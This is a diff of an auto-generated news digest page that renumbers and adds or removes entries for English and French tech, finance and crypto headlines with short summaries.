 This week, Alta unveiled its first integration collaboration, teaming up with Public School, a storied New York City brand.
 
@@ -7886,7 +7878,7 @@ This week, Alta unveiled its first integration collaboration, teaming up with Pu
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 32. `EN` [India doubles down on state-backed venture capital, approving $1.1B fund](data/articles/cf42cdecbcdb330e399dab3109401587.html)
+### 27. `EN` [India doubles down on state-backed venture capital, approving $1.1B fund](data/articles/cf42cdecbcdb330e399dab3109401587.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
 India’s $1.1 billion fund-of-funds will invest through private VCs to support deep tech and manufacturing startups.
 
@@ -7894,7 +7886,7 @@ India’s $1.1 billion fund-of-funds will invest through private VCs to support 
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 33. `EN` [Why top talent is walking away from OpenAI and xAI](data/articles/51e6b7a7c78fd79f0edd6a470a5d91ce.html)
+### 28. `EN` [Why top talent is walking away from OpenAI and xAI](data/articles/51e6b7a7c78fd79f0edd6a470a5d91ce.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
 AI companies have been hemorrhaging talent the past few weeks. Half of xAI’s founding team has left the company — some on their own, others through “restructuring” — while OpenAI is facing its own shakeups, from the disbanding of its mission alignment team to the firing of a policy exec who opposed its “adult mode” feature. Watch as TechCrunch’s Equity podcast hosts Kirsten Korosec, Anthony […]
 
@@ -7902,7 +7894,7 @@ AI companies have been hemorrhaging talent the past few weeks. Half of xAI’
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 34. `EN` [Score, the dating app for people with good credit, is back](data/articles/58c870459f84a2a139856b8651db7c7f.html)
+### 29. `EN` [Score, the dating app for people with good credit, is back](data/articles/58c870459f84a2a139856b8651db7c7f.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
 Two years ago, a controversial dating app was launched and quickly shuttered: for people with good-to-excellent credit. Now, the founder is relaunching it, open to anyone.
 
@@ -7910,23 +7902,15 @@ Two years ago, a controversial dating app was launched and quickly shuttered: fo
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 35. `EN` [Fusion startup Helion hits blistering temps as it races toward 2028 deadline](data/articles/4817b870a444d2c0a505fac31250a84e.html)
+### 30. `EN` [Fusion startup Helion hits blistering temps as it races toward 2028 deadline](data/articles/4817b870a444d2c0a505fac31250a84e.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
 Helion's Polaris device hit 150 million degrees C recently, a milestone that nudges the company toward its commercial power plant that will sell electricity to Microsoft.
 
 </div>
 
-<div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
-
-### 36. `EN` [Didero lands $30M to put manufacturing procurement on ‘agentic’ autopilot](data/articles/7272fcaea6a5d19be991ec77c3b84505.html)
-**Source:** TechCrunch Startups | **Keyword:** `Tech`
-Didero functions as an agentic AI layer that sits on top of a company’s existing ERP, acting as a coordinator that reads incoming communications and automatically executes the necessary updates and tasks.
-
-</div>
-
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 37. `FR` [CIC Start Innovation Awards 2026 : le Sud-Ouest donne le coup d’envoi de sa 7ᵉ édition](data/articles/5b8bbc67bb4fcb9b5955c4b670add1b0.html)
+### 31. `FR` [CIC Start Innovation Awards 2026 : le Sud-Ouest donne le coup d’envoi de sa 7ᵉ édition](data/articles/5b8bbc67bb4fcb9b5955c4b670add1b0.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 Le CIC Sud Ouest ouvre officiellement les candidatures de la 7ᵉ édition des CIC Start Innovation Awards, rendez-vous désormais installé dans l’écosystème start-up et innovation du grand Sud-Ouest.L’événement se tiendra les 25 et 26 mars 2026 à Bordeaux, avec une finale régionale organisée au CAPC – musée d’art contemporain, le 26 mars. Pensé comme un …
 
@@ -7934,7 +7918,7 @@ Le CIC Sud Ouest ouvre officiellement les candidatures de la 7ᵉ édition des C
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 38. `FR` [Pourquoi lever auprès d’un gros fonds d’investissement n’est pas toujours un avantage pour un fondateur](data/articles/b0f8b20c40eb1b77f94cbf4699fe1e1d.html)
+### 32. `FR` [Pourquoi lever auprès d’un gros fonds d’investissement n’est pas toujours un avantage pour un fondateur](data/articles/b0f8b20c40eb1b77f94cbf4699fe1e1d.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 Lever des fonds auprès d’un grand fonds de venture capital reste, pour beaucoup d’entrepreneurs, une forme de consécration. Montants élevés, marque reconnue, accès supposé à un réseau international, l’équation paraît évidente et pourtant, derrière cette évidence apparente se cache une réalité plus nuancée. Car un fonds très capitalisé n’est pas seulement un investisseur plus riche, …
 
@@ -7942,7 +7926,7 @@ Lever des fonds auprès d’un grand fonds de venture capital reste, pour beauco
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 39. `FR` [Robotique humanoïde : la fin de la promesse, le début de l’industrialisation – Perspectives avec Nicolas Halftermeyer](data/articles/135b9840179d32bbe8fff7f694471d70.html)
+### 33. `FR` [Robotique humanoïde : la fin de la promesse, le début de l’industrialisation – Perspectives avec Nicolas Halftermeyer](data/articles/135b9840179d32bbe8fff7f694471d70.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 En 2010, au CES de Las Vegas, les drones grand public n’étaient encore qu’une intuition industrielle. Quinze ans plus tard, la robotique humanoïde traverse un moment comparable. Nicolas Halftermeyer, expert de long terme, passé par Parrot puis Aldebaran, nous partage dans ce nouveau numéro de Perspectives, son analyse d’un domaine où l’innovation atteint une vélocité …
 
@@ -7950,7 +7934,7 @@ En 2010, au CES de Las Vegas, les drones grand public n’étaient encore qu’u
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 40. `FR` [TECHARENA 2026 : New Era, Next Mindset, ou le moment de vérité pour l’innovation européenne](data/articles/308bc3b16a2482b6fa56b3b14b0849c6.html)
+### 34. `FR` [TECHARENA 2026 : New Era, Next Mindset, ou le moment de vérité pour l’innovation européenne](data/articles/308bc3b16a2482b6fa56b3b14b0849c6.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 Pour son édition 2026, du 11 au 12 février à Stockholm, Techarena a choisi un intitulé explicite, New Era, Next Mindset. Derrière la formule, l’événement acte surtout un basculement d’un écosystème technologique entré dans une phase de normalisation contrainte, marquée par la fin de l’argent abondant, la montée des enjeux de souveraineté et la politisation …
 
@@ -7958,7 +7942,7 @@ Pour son édition 2026, du 11 au 12 février à Stockholm, Techarena a choisi un
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 41. `FR` [SXSW Innovation Conference 2026 : une semaine pour lire les signaux faibles de la tech et de la culture](data/articles/393c927f80f7dadb8824f6ae76c0714a.html)
+### 35. `FR` [SXSW Innovation Conference 2026 : une semaine pour lire les signaux faibles de la tech et de la culture](data/articles/393c927f80f7dadb8824f6ae76c0714a.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 Du 12 au 18 mars 2026, Austin (Texas) accueillera une nouvelle édition de la SXSW Innovation Conference, rendez-vous hybride où se croisent technologies émergentes, industries créatives et transformations sociétales. Un format unifié, pensé pour décloisonner les disciplines et multiplier les occasions d’apprentissage comme de rencontres, dans un contexte où l’innovation se joue de plus en …
 
@@ -7966,7 +7950,7 @@ Du 12 au 18 mars 2026, Austin (Texas) accueillera une nouvelle édition de la SX
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 42. `FR` [Aux côtés de Mistral AI, Nscale ou Lovable, ELEVEN LABS incarne la nouvelle génération de startups AI-native européennes](data/articles/53e778ac2a54645de14143a3974ca174.html)
+### 36. `FR` [Aux côtés de Mistral AI, Nscale ou Lovable, ELEVEN LABS incarne la nouvelle génération de startups AI-native européennes](data/articles/53e778ac2a54645de14143a3974ca174.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 Aux côtés de Mistral AI, Nscale, Lovable, n8n ou encore Legora, ElevenLabs illustre l’émergence d’une nouvelle génération de startups dites AI-native. Des entreprises qui ne se contentent pas d’intégrer de l’intelligence artificielle à un produit existant, mais qui construisent leur offre, leur interface et leur modèle économique directement à partir des capacités des modèles. Fondée …
 
@@ -7974,7 +7958,7 @@ Aux côtés de Mistral AI, Nscale, Lovable, n8n ou encore Legora, ElevenLabs ill
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 43. `FR` [UBEES sécurise huit millions d’euros pour industrialiser la pollinisation connectée](data/articles/dd6e4eb1c9d6fa215508bcd40a0a4650.html)
+### 37. `FR` [UBEES sécurise huit millions d’euros pour industrialiser la pollinisation connectée](data/articles/dd6e4eb1c9d6fa215508bcd40a0a4650.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 UBEES inscrit la pollinisation au cœur de la performance agricole L’agtech a prospéré sur la promesse d’une agriculture augmentée par la technologie. Capteurs, automatisation et plateformes de données ont structuré un récit d’innovation souvent porté par l’offre plus que par la demande. Ce cycle touche aujourd’hui à sa fin, sous l’effet d’une rationalisation du …
 
@@ -7982,7 +7966,7 @@ UBEES inscrit la pollinisation au cœur de la performance agricole L’agtech a 
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 44. `FR` [CURE 51 : soigner le cancer en partant des survivants](data/articles/ebd521b815d560576dfdff7de9ec90aa.html)
+### 38. `FR` [CURE 51 : soigner le cancer en partant des survivants](data/articles/ebd521b815d560576dfdff7de9ec90aa.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 il y a deux manières de raconter l’innovation en santé, la première consiste à empiler des promesses avec une IA qui va tout voir, tout prédire, tout guérir, et la seconde, qui commence par un constat plus inconfortable, qui est que malgré des décennies d’efforts, certains cancers restent des impasses thérapeutiques, avec des lignes de …
 
@@ -7990,7 +7974,7 @@ il y a deux manières de raconter l’innovation en santé, la première consist
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 45. `FR` [Rebranding en stand-by, visuels bricolés… startups, attention à la dette graphique !](data/articles/89c32f8a3e5b9982eddd6553b543b881.html)
+### 39. `FR` [Rebranding en stand-by, visuels bricolés… startups, attention à la dette graphique !](data/articles/89c32f8a3e5b9982eddd6553b543b881.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 La dette graphique est ce passif invisible qui s’installe discrètement dans les startups. Au départ, tout semble aller vite et bien : un logo bricolé, des visuels faits maison, un rebranding repoussé à plus tard. Mais avec le temps, cette accumulation de compromis finit par peser lourd. Comme la dette technique, la dette graphique fragilise …
 
@@ -7998,7 +7982,7 @@ La dette graphique est ce passif invisible qui s’installe discrètement dans l
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 46. `FR` [Du clic à la conversion : CyberCité dévoile la 9ᵉ édition de More Traffic, More Business](data/articles/211e45d108d8d41027223fe45526297f.html)
+### 40. `FR` [Du clic à la conversion : CyberCité dévoile la 9ᵉ édition de More Traffic, More Business](data/articles/211e45d108d8d41027223fe45526297f.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 Dans un environnement digital où les parcours clients se complexifient et où les attentes des consommateurs évoluent rapidement, il ne suffit plus de générer des clics. La performance marketing repose désormais sur la capacité des marques à transformer ces interactions en conversions solides, tout en conservant la préférence du consommateur. C’est dans ce contexte que …
 
@@ -8006,7 +7990,7 @@ Dans un environnement digital où les parcours clients se complexifient et où l
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 47. `FR` [Michel PAULIN : la souveraineté numérique ne se décrète pas, elle se construit par la croissance, la commande et le capital](data/articles/d21e000d1d499258096a54e4b12cadaa.html)
+### 41. `FR` [Michel PAULIN : la souveraineté numérique ne se décrète pas, elle se construit par la croissance, la commande et le capital](data/articles/d21e000d1d499258096a54e4b12cadaa.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 Ce lundi 26 janvier 2026, au Ministère de l’Économie et des Finances, se tenaient les premières Rencontres de la souveraineté numérique, un nouvel espace de débat pensé comme un point de convergence entre pouvoirs publics, grandes entreprises, institutions et acteurs du numérique. Organisé par le ministère délégué chargé de l’Intelligence artificielle et du Numérique, l’événement …
 
@@ -8014,7 +7998,7 @@ Ce lundi 26 janvier 2026, au Ministère de l’Économie et des Finances, se ten
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 48. `FR` [Avec ACTILITY, NETMORE tente de structurer un marché LoRaWAN longtemps fragmenté](data/articles/febdf8f0097249368cdc4be7db7b5da1.html)
+### 42. `FR` [Avec ACTILITY, NETMORE tente de structurer un marché LoRaWAN longtemps fragmenté](data/articles/febdf8f0097249368cdc4be7db7b5da1.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 L’acquisition d’Actility par Netmore, annoncée ce jour, s’inscrit dans un mouvement que le marché de l’IoT massif anticipait sans jamais vraiment le voir se matérialiser. Après plus d’une décennie de diffusion technologique rapide mais désordonnée, l’écosystème LoRaWAN entre dans une phase de consolidation qui répond moins à un besoin d’innovation qu’à une exigence d’industrialisation. Le …
 
@@ -8022,7 +8006,7 @@ L’acquisition d’Actility par Netmore, annoncée ce jour, s’inscrit dans un
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 49. `FR` [2026, le quantique à l’épreuve du réel avec Fanny Bouton et Olivier Ezratty](data/articles/d8bd04d2723b7ac1bb37603b0433b47a.html)
+### 43. `FR` [2026, le quantique à l’épreuve du réel avec Fanny Bouton et Olivier Ezratty](data/articles/d8bd04d2723b7ac1bb37603b0433b47a.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 FWMedia ouvre une nouvelle saison de son émission Le Club, que nous avons décidé de rebaptiser FW PERSPECTIVES. En collaboration avec CanalChat Grandialogue, il s’agit d’un format de conversation et d’analyse consacré aux trajectoires longues de l’innovation, de l’industrie et du pouvoir. L’objectif est de comprendre ce qui structure réellement les technologies, les marchés et …
 
@@ -8030,7 +8014,7 @@ FWMedia ouvre une nouvelle saison de son émission Le Club, que nous avons déci
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 50. `FR` [NVIDIA GTC, cartographie d’un écosystème du compute en voie de consolidation](data/articles/7c03519189f735135628f7238f67f954.html)
+### 44. `FR` [NVIDIA GTC, cartographie d’un écosystème du compute en voie de consolidation](data/articles/7c03519189f735135628f7238f67f954.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 Présentée comme la première conférence mondiale dédiée à l’intelligence artificielle, la NVIDIA GTC occupe désormais une place singulière dans le calendrier technologique international. À San Jose comme en ligne, l’événement réunit développeurs, chercheurs, dirigeants et industriels autour d’un même objet, le calcul accéléré, devenu le socle matériel et économique de la nouvelle vague d’innovations en …
 
@@ -8038,7 +8022,7 @@ Présentée comme la première conférence mondiale dédiée à l’intelligence
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 51. `FR` [Cyber-Physical Systems : comprendre les systèmes où le numérique pilote le réel](data/articles/c899f958a4d35fdde5e5f25e23bc814b.html)
+### 45. `FR` [Cyber-Physical Systems : comprendre les systèmes où le numérique pilote le réel](data/articles/c899f958a4d35fdde5e5f25e23bc814b.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 Les Cyber-Physical Systems, plus connus sous l’acronyme CPS, s’imposent progressivement comme une catégorie technologique centrale pour comprendre l’évolution de l’industrie, des infrastructures critiques et, plus largement, de l’économie numérique avancée. Longtemps cantonnés aux cercles académiques et aux ingénieries de pointe, ils désignent aujourd’hui une réalité opérationnelle qui structure la robotique, l’énergie, la mobilité, la santé …
 
@@ -8046,7 +8030,7 @@ Les Cyber-Physical Systems, plus connus sous l’acronyme CPS, s’imposent prog
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 52. `FR` [Le 28e régime européen : un nouveau cadre pour faire émerger des champions du numérique en Europe](data/articles/bbefb5a68a8a6c6fc0d1f3895964dd5b.html)
+### 46. `FR` [Le 28e régime européen : un nouveau cadre pour faire émerger des champions du numérique en Europe](data/articles/bbefb5a68a8a6c6fc0d1f3895964dd5b.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 En marge du Forum économique mondial de Davos, le 20 janvier 2026, la présidente de la Commission européenne, Ursula von der Leyen, a officialisé le projet EU-INC. Depuis plus d’une décennie, entrepreneurs, investisseurs et institutions pointent les limites d’un marché unique qui cesse de l’être dès qu’il s’agit de créer, financer ou développer une entreprise …
 
@@ -8054,7 +8038,7 @@ En marge du Forum économique mondial de Davos, le 20 janvier 2026, la présiden
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 53. `FR` [Paris-Saclay Summit 2026 : la science comme levier de souveraineté européenne](data/articles/b3ece085fe97d21a9e5034ad4a2c96a3.html)
+### 47. `FR` [Paris-Saclay Summit 2026 : la science comme levier de souveraineté européenne](data/articles/b3ece085fe97d21a9e5034ad4a2c96a3.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 Les 18 et 19 février 2026, le Paris-Saclay Summit tiendra sa troisième édition à CentraleSupélec, au cœur du cluster Paris-Saclay. En moins de trois ans, l’événement s’est imposé comme un rendez-vous à part dans le paysage européen, non pas une vitrine de l’innovation, mais un espace de débat sur le rôle stratégique de la science …
 
@@ -8062,7 +8046,7 @@ Les 18 et 19 février 2026, le Paris-Saclay Summit tiendra sa troisième éditio
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 54. `FR` [Comment le Royaume-Uni veut faire de la réglementation un levier de compétitivité technologique](data/articles/da4ab9f08afc5982036cbb4f3e84747f.html)
+### 48. `FR` [Comment le Royaume-Uni veut faire de la réglementation un levier de compétitivité technologique](data/articles/da4ab9f08afc5982036cbb4f3e84747f.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 Si, officiellement, il s’agit de réduire les lourdeurs administratives qui freinent la mise sur le marché de technologies déjà opérationnelles, l’annonce du Regulatory Innovation Office (RIO), qui érige la robotique et les technologies de défense en priorités, s’inscrit dans une évolution plus profonde de la doctrine britannique, où la réglementation n’est plus seulement un cadre …
 
@@ -8070,7 +8054,7 @@ Si, officiellement, il s’agit de réduire les lourdeurs administratives qui fr
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 55. `FR` [Dans la course à l’IA, le recrutement devient une décision stratégique](data/articles/dee32f88214e32c09f4c05d9057041a7.html)
+### 49. `FR` [Dans la course à l’IA, le recrutement devient une décision stratégique](data/articles/dee32f88214e32c09f4c05d9057041a7.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 Alors que les entreprises entrent dans une nouvelle ère, celle de l’IA, de l’efficacité et de la résilience, une transformation silencieuse s’impose. Le recrutement n’est plus une fonction support. Il devient désormais un levier stratégique pour les entreprises, au cœur de la compétitivité, de l’innovation et de la capacité d’exécution des organisations. digiRocks, qui a …
 
@@ -8100,9 +8084,25 @@ Both AWS and the Amazon retail business have big opportunities to reap the finan
 
 </div>
 
+<div class="article-item" data-lang="fr" data-category="finance" data-source="Investing.com">
+
+### 3. `FR` [U.S. stocks pare some gains after Fed minutes flag possible rate hikes](data/articles/d5259bd3f13a662a2e9dd9796d9a35cc.html)
+**Source:** Investing.com | **Keyword:** `Finance`
+U.S. stocks pare some gains after Fed minutes flag possible rate hikes
+
+</div>
+
+<div class="article-item" data-lang="en" data-category="finance" data-source="Investing.com">
+
+### 4. `EN` [Retail traders buy software dip as Wall Street reprices AI-threatened stocks](data/articles/f1977ec0795b66e6b80bae7e86b0d7c2.html)
+**Source:** Investing.com | **Keyword:** `Finance`
+Retail traders buy software dip as Wall Street reprices AI-threatened stocks
+
+</div>
+
 <div class="article-item" data-lang="en" data-category="finance" data-source="MarketWatch">
 
-### 3. `EN` [Palo Alto Networks’ stock falls after earnings. These analysts see a good chance to buy.](data/articles/7c3aacb6d9c9b50a5cf35e25820455ad.html)
+### 5. `EN` [Palo Alto Networks’ stock falls after earnings. These analysts see a good chance to buy.](data/articles/7c3aacb6d9c9b50a5cf35e25820455ad.html)
 **Source:** MarketWatch | **Keyword:** `Finance`
 Some analysts encourage investors to look past a muddy outlook and focus on the company’s recent momentum and AI opportunity.
 
@@ -8110,7 +8110,7 @@ Some analysts encourage investors to look past a muddy outlook and focus on the 
 
 <div class="article-item" data-lang="en" data-category="finance" data-source="MarketWatch">
 
-### 4. `EN` [‘She spent over $1,000 a month on weight-loss drugs’: My son wrecked his finances after meeting his girlfriend. Who’s to blame?](data/articles/6479c55db616883bfc2ad03e706efad7.html)
+### 6. `EN` [‘She spent over $1,000 a month on weight-loss drugs’: My son wrecked his finances after meeting his girlfriend. Who’s to blame?](data/articles/6479c55db616883bfc2ad03e706efad7.html)
 **Source:** MarketWatch | **Keyword:** `Finance`
 “My son is smart — he really is — but he was in love.”
 
@@ -8308,17 +8308,9 @@ Alors que les cryptomonnaies entrent dans les sphères financières traditionnel
 
 </div>
 
-<div class="article-item" data-lang="en" data-category="crypto" data-source="Decrypt">
-
-### 24. `EN` [Morning Minute: Harvard Sells Bitcoin for Ethereum](data/articles/6d305e782506777f639a18432cc3bda1.html)
-**Source:** Decrypt | **Keyword:** `Crypto`
-Harvard's rotation from Bitcoin to ETH has raised the primary question—what do they know?
-
-</div>
-
 <div class="article-item" data-lang="fr" data-category="crypto" data-source="Cryptoast">
 
-### 25. `FR` [Jusqu'à 80 $ en Bitcoin offerts en achetant un wallet crypto Ledger](data/articles/d06c59a1a64d2e1ebebc016d564dad95.html)
+### 24. `FR` [Jusqu'à 80 $ en Bitcoin offerts en achetant un wallet crypto Ledger](data/articles/d06c59a1a64d2e1ebebc016d564dad95.html)
 **Source:** Cryptoast | **Keyword:** `Crypto`
 Jusqu'à 80 $ en Bitcoin offerts en achetant un wallet crypto Ledger
 
@@ -8326,7 +8318,7 @@ Jusqu'à 80 $ en Bitcoin offerts en achetant un wallet crypto Ledger
 
 <div class="article-item" data-lang="fr" data-category="crypto" data-source="Cryptoast">
 
-### 26. `FR` [Il faudra s'armer de patience avant de voir le Bitcoin repartir en tendance haussière](data/articles/169496e0886dcea2c7932de155b9ba17.html)
+### 25. `FR` [Il faudra s'armer de patience avant de voir le Bitcoin repartir en tendance haussière](data/articles/169496e0886dcea2c7932de155b9ba17.html)
 **Source:** Cryptoast | **Keyword:** `Crypto`
 Le Bitcoin se trouve actuellement dans une situation compliquée, avec un prix qui oscille dangereusement sous le niveau des 70 000 dollars. Une tendance baissière qui pourrait bien être amenée à durer dans le temps, en particulier car l’économie reste paradoxalement assez stable.
 
@@ -8334,7 +8326,7 @@ Le Bitcoin se trouve actuellement dans une situation compliquée, avec un prix q
 
 <div class="article-item" data-lang="en" data-category="crypto" data-source="Decrypt">
 
-### 27. `EN` [Steak 'n Shake Says Bitcoin Has Lifted Sales 'Dramatically' in 9 Months](data/articles/cece18535f8a159645bfe6031876c2b5.html)
+### 26. `EN` [Steak 'n Shake Says Bitcoin Has Lifted Sales 'Dramatically' in 9 Months](data/articles/cece18535f8a159645bfe6031876c2b5.html)
 **Source:** Decrypt | **Keyword:** `Crypto`
 The fast-food chain says bitcoin payments have boosted sales, as it channels crypto receipts into a growing corporate reserve.
 
@@ -8342,9 +8334,17 @@ The fast-food chain says bitcoin payments have boosted sales, as it channels cry
 
 <div class="article-item" data-lang="en" data-category="crypto" data-source="Decrypt">
 
-### 28. `EN` [Vitalik Buterin: Hedging on Prediction Markets Could 'Replace Fiat Currency'](data/articles/277d082dcd4cac797ad79295f2da7641.html)
+### 27. `EN` [Vitalik Buterin: Hedging on Prediction Markets Could 'Replace Fiat Currency'](data/articles/277d082dcd4cac797ad79295f2da7641.html)
 **Source:** Decrypt | **Keyword:** `Crypto`
 The Ethereum co-founder argues that prediction markets’ current focus on short-term crypto bets is putting them on a path to ‘corposlop.’
+
+</div>
+
+<div class="article-item" data-lang="en" data-category="crypto" data-source="CoinTelegraph">
+
+### 28. `EN` [DerivaDEX launches Bermuda-licensed derivatives exchange under DAO governance](data/articles/ba5eeac914387676256a437997e52f49.html)
+**Source:** CoinTelegraph | **Keyword:** `Crypto`
+The decentralized exchange has begun offering crypto perpetual swaps after receiving a test license from Bermuda’s regulator, operating under DAO governance and formal oversight.
 
 </div>
 
@@ -8852,17 +8852,9 @@ Ether adoption grows as major endowments shift capital, BlackRock launches a sta
 
 </div>
 
-<div class="article-item" data-lang="en" data-category="crypto" data-source="CoinTelegraph">
-
-### 92. `EN` [HIVE Digital posts 219% revenue jump as miner-AI hybrid strategy gains traction](data/articles/138ad4a256590dbd1718c4c3d1715d52.html)
-**Source:** CoinTelegraph | **Keyword:** `Crypto`
-Third-quarter results show revenue growth despite lower Bitcoin prices, alongside new AI computing contracts, as HIVE continues to expand beyond its core mining business.
-
-</div>
-
 <div class="article-item" data-lang="en" data-category="crypto" data-source="Decrypt">
 
-### 93. `EN` [Abu Dhabi Funds Boosted BlackRock Bitcoin ETF Exposure to $1 Billion by End of 2025: Filings](data/articles/d6725bfbb72e6d7cc324ea5235c746bc.html)
+### 92. `EN` [Abu Dhabi Funds Boosted BlackRock Bitcoin ETF Exposure to $1 Billion by End of 2025: Filings](data/articles/d6725bfbb72e6d7cc324ea5235c746bc.html)
 **Source:** Decrypt | **Keyword:** `Crypto`
 Abu Dhabi funds added to their Bitcoin exposure in Q4, jumping to more than $1 billion worth of IBIT at the conclusion of the year.
 
@@ -8870,7 +8862,7 @@ Abu Dhabi funds added to their Bitcoin exposure in Q4, jumping to more than $1 b
 
 <div class="article-item" data-lang="en" data-category="crypto" data-source="Decrypt">
 
-### 94. `EN` [Bitcoin Miner Bitdeer Overtakes MARA, Establishing Hash Rate Lead: JPMorgan](data/articles/4e35610b62a444e16dc08c1691d1c9ef.html)
+### 93. `EN` [Bitcoin Miner Bitdeer Overtakes MARA, Establishing Hash Rate Lead: JPMorgan](data/articles/4e35610b62a444e16dc08c1691d1c9ef.html)
 **Source:** Decrypt | **Keyword:** `Crypto`
 Bitcoin miner Bitdeer has overtaken MARA in terms of self-mining hash rate among publicly traded companies, according to JPMorgan analysts.
 
@@ -8878,7 +8870,7 @@ Bitcoin miner Bitdeer has overtaken MARA in terms of self-mining hash rate among
 
 <div class="article-item" data-lang="en" data-category="crypto" data-source="Decrypt">
 
-### 95. `EN` [Gemini Stock Dives as Winklevoss-Led Crypto Exchange Dumps Executives](data/articles/931b4d611168527efe602c2398ab1348.html)
+### 94. `EN` [Gemini Stock Dives as Winklevoss-Led Crypto Exchange Dumps Executives](data/articles/931b4d611168527efe602c2398ab1348.html)
 **Source:** Decrypt | **Keyword:** `Crypto`
 Shares in publicly traded crypto exchange Gemini are plunging as the firm parts ways with three executives following broader layoffs.
 
@@ -8886,7 +8878,7 @@ Shares in publicly traded crypto exchange Gemini are plunging as the firm parts 
 
 <div class="article-item" data-lang="en" data-category="crypto" data-source="Decrypt">
 
-### 96. `EN` [Is the Netherlands Taxing Unrealized Crypto Gains? It's Complicated](data/articles/e69474dc066d00a8727b9407a01f2c88.html)
+### 95. `EN` [Is the Netherlands Taxing Unrealized Crypto Gains? It's Complicated](data/articles/e69474dc066d00a8727b9407a01f2c88.html)
 **Source:** Decrypt | **Keyword:** `Crypto`
 From 2028, the Netherlands will update how tax is calculated on unrealized gains. Crypto critics are in uproar—but the reality is nuanced.
 
@@ -8894,7 +8886,7 @@ From 2028, the Netherlands will update how tax is calculated on unrealized gains
 
 <div class="article-item" data-lang="en" data-category="crypto" data-source="Decrypt">
 
-### 97. `EN` [Strategy’s Bitcoin Buying Accelerates as $48 Billion BTC Stash Sits Underwater](data/articles/83cd87e76e192de100357453f01fe5fa.html)
+### 96. `EN` [Strategy’s Bitcoin Buying Accelerates as $48 Billion BTC Stash Sits Underwater](data/articles/83cd87e76e192de100357453f01fe5fa.html)
 **Source:** Decrypt | **Keyword:** `Crypto`
 Strategy reported its fourth-largest Bitcoin purchase of the year, a week after Michael Saylor's defense of the company's became a meme.
 
@@ -8902,7 +8894,7 @@ Strategy reported its fourth-largest Bitcoin purchase of the year, a week after 
 
 <div class="article-item" data-lang="fr" data-category="crypto" data-source="Cryptoast">
 
-### 98. `FR` [« Peur extrême » : le Crypto Fear and Greed Index touche de plus bas historiques](data/articles/14392496d233ba814f006c019102b2d8.html)
+### 97. `FR` [« Peur extrême » : le Crypto Fear and Greed Index touche de plus bas historiques](data/articles/14392496d233ba814f006c019102b2d8.html)
 **Source:** Cryptoast | **Keyword:** `Crypto`
 Dans le sillage d'une importante chute des prix, le Crypto Fear and Greed Index évolue actuellement sur des niveaux historiquement bas. Zoomons sur cet indicateur, particulièrement révélateur du sentiment des investisseurs.
 
@@ -8910,7 +8902,7 @@ Dans le sillage d'une importante chute des prix, le Crypto Fear and Greed Index 
 
 <div class="article-item" data-lang="en" data-category="crypto" data-source="Decrypt">
 
-### 99. `EN` [ZeroLend Latest DeFi Platform to Shut Down Amid Liquidity, Revenue Pressures](data/articles/5e0d2678a0783d61f53fbff3e87f182f.html)
+### 98. `EN` [ZeroLend Latest DeFi Platform to Shut Down Amid Liquidity, Revenue Pressures](data/articles/5e0d2678a0783d61f53fbff3e87f182f.html)
 **Source:** Decrypt | **Keyword:** `Crypto`
 ZeroLend cited an inability to "generate sustainable revenue" as it became the latest DeFi platform to wind down amid the ongoing slump.
